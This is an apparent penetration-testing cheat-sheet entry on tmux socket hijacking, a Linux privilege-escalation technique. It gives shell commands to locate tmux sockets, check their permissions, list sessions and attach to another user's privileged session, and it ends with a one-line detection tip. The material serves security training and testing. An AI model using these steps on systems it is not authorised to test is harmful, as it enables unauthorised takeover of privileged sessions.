---
technique: tmux Socket Hijacking
category: privilege-escalation
targets: Linux tmux
protocols: Local
remote_capable: false
tags: linux privilege-escalation tmux socket session
---

# tmux Socket Hijacking

tmux socket hijacking attaches to another user's session when socket permissions expose a privileged tmux server.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Readable socket | Current user or group must access the tmux socket |
| Active session | A tmux server must be running with a useful session |
| Compatible terminal | Attaching requires an interactive terminal |

## Linux

### List current tmux sessions

#sh #tmux #recon

List tmux sessions visible through the default socket.

```sh title:"List default tmux sessions"
tmux ls
```
<!-- cheat -->

### Find tmux sockets

#sh #tmux #socket

Find tmux sockets in temporary directories.

```sh title:"Find tmux sockets"
find /tmp -type s -path '*/tmux-*/*' 2>/dev/null
```
<!-- cheat -->

### Check tmux socket permissions

#sh #tmux #socket

Check permissions on a candidate tmux socket.

```sh title:"Check tmux socket permissions"
ls -la "$socket_path"
```
<!-- cheat
var socket_path
-->

### List sessions through socket

#sh #tmux #socket

List sessions exposed by a candidate tmux socket.

```sh title:"List sessions through tmux socket"
tmux -S "$socket_path" ls
```
<!-- cheat
var socket_path
-->

### Attach through socket

#sh #tmux #socket

Attach to a session through a candidate tmux socket.

```sh title:"Attach through tmux socket"
tmux -S "$socket_path" attach -t "$session_name"
```
<!-- cheat
var socket_path
var session_name
-->

## Detection

Monitor tmux sockets with group or world access and unexpected clients attaching to privileged sessions.
